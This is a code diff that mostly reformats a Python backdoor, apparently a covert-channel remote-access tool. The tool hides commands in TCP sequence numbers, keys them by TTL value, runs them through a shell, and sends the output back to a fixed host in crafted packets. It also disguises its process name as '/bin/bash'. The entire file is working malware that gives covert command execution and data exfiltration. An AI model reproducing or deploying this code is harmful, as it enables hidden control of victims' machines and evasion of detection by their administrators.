@@ -17,68 +17,106 @@ import setproctitle
 Setup: pip3 install pycrypto setproctitle scapy
 """
 
-TTL=234
-TTLKEY=222
-victim=("192.168.0.7",9999)
+TTL = 234
+TTLKEY = 222
+victim = ("192.168.0.7", 9999)
 messages = []
 setFlag = "E"
 
-myip=("192.168.0.3",66)
+myip = ("192.168.0.3", 66)
 
-def secret_send(msg:str, type:str='command'):
+
+def secret_send(msg: str, type: str = 'command'):
     """
     Keyword arguments:
     msg      - payload being sent
     type     - file or command (default:command)
     """
     if(type == "command"):
-        #Convert message to ASCII to bits
+        # Convert message to ASCII to bits
         msg = message_to_bits(msg)
         chunks = message_spliter(msg)
         packets = packatizer(chunks)
+
         for packet in packets:
             send(packet, verbose=False)
             pass
 
+
 def packatizer(msg):
-    #Create the packets array as a placeholder.
+    """[summary]
+    
+    Arguments:
+        msg {[type]} -- [description]
+    
+    Returns:
+        [type] -- [description]
+    """
+
+    # Create the packets array as a placeholder.
     packets = []
-    #If the length of the number is larger than what is allowed in one packet, split it
+    # If the length of the number is larger than what is allowed in one packet, split it
     counter = 0
 
-    #If not an array (if there is only one packet.)
+    # If not an array (if there is only one packet.)
     if(type(msg) is str):
-        #The transmissions position and total will be 1.
+        # The transmissions position and total will be 1.
         # i.e. 1/1 message to send.
         packets.append(craft(msg))
-    #If an array (if there is more than one packet)
+    # If an array (if there is more than one packet)
     elif(type(msg) is list):
         while (counter < len(msg)):
-            #The position will be the array element and the total will be the
+            # The position will be the array element and the total will be the
             # length.
             # i.e. 1/3 messages to send.
             packets.append(craft(msg[counter]))
             counter = counter + 1
-    packets.append(IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], flags="U"))
+    packets.append(IP(dst=victim[0], ttl=TTL) /
+                   TCP(sport=myip[1], dport=victim[1], flags="U"))
     return packets
 
-def craft(data:str) -> IP:
+
+def craft(data: str) -> IP:
+    """[summary]
+    
+    Arguments:
+        data {str} -- [description]
+    
+    Returns:
+        IP -- [description]
+    """
+
     global TTL
     global setFlag
-    #The payload contains the unique password, UID, position number and total.
-    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], \
-        seq=int(str(data),2), flags=setFlag)
+    # The payload contains the unique password, UID, position number and total.
+    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],
+                                            seq=int(str(data), 2), flags=setFlag)
     return packet
 
+
 def execPayload(command):
-    #Execute the command
-    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    result = proc.stdout.read()  + proc.stderr.read()
+    """[summary]
+    
+    Arguments:
+        command {[type]} -- [description]
+    """
+
+    # Execute the command
+    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    result = proc.stdout.read() + proc.stderr.read()
     payload = str(result)
-    print (payload)
+    print(payload)
     secret_send(payload)
 
+
 def commandResult(packet):
+    """[summary]
+    
+    Arguments:
+        packet {[type]} -- [description]
+    """
+
     global TTLKEY
     global messages
     ttl = packet[IP].ttl
@@ -88,21 +126,21 @@ def commandResult(packet):
         #  the client set an "Echo" flag to make sure the receiver knows it's truly them
         if flag == 0x40:
             field = packet[TCP].seq
-            #Converts the bits to the nearest divisible by 8
+            # Converts the bits to the nearest divisible by 8
             covertContent = lengthChecker(field)
             messages.append(text_from_bits(covertContent))
-        #End Flag detected
+        # End Flag detected
         elif flag == 0x20:
-            payload=''.join(messages)
+            payload = ''.join(messages)
             execPayload(payload)
             messages = []
-    else:
-        return
+
 
 def commandSniffer():
     sniff(filter="tcp and host "+victim[0], prn=commandResult)
 
-setproctitle.setproctitle("/bin/bash") #set fake process name
+
+setproctitle.setproctitle("/bin/bash")  # set fake process name
 
 sniffThread = threading.Thread(target=commandSniffer)
 fileMonitor = Monitor()
@@ -111,12 +149,4 @@ fileMonitor.daemon = True
 sniffThread.daemon = True
 
 sniffThread.start()
-#fileMonitor.start()
-
-while True:
-    try:
-        time.sleep(5)
-    except KeyboardInterrupt:
-        #reset()
-        print ("Exiting")
-        sys.exit(0)
+# fileMonitor.start()
